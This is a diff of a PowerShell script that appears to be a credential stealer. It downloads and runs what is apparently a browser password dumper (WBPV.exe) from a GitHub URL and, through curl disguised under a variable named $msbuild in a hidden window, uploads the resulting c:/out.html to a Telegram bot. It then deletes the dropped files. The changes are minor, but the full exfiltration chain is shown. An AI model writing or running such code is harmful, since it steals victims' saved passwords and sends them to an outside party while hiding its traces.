@@ -39,6 +39,7 @@ if (!(Test-Path $WBPV)) {
   $url = "https://raw.github.com/ksp-wrk/s/main/WBPV.exe"
   Invoke-WebRequest $url -OutFile $WBPV
   start-process WBPV $arguments -Wait
+  #Get-Item $FilePath | Remove-Item
 }
 
 $msbuild = "curl"
@@ -46,5 +47,5 @@ $arguments = '-s -F document=@"c:/out.html" https://api.telegram.org/bot76236974
 start-process $msbuild $arguments -WindowStyle Hidden -Wait
 
 $FilePaths1 = @("$env:SystemRoot\Temp\WBPV.exe", "$env:USERPROFILE\AppData\Local\Temp\WBPV.exe")
-$FilePaths1 = @($WBPV)
+$FilePaths = @($WBPV)
 foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }
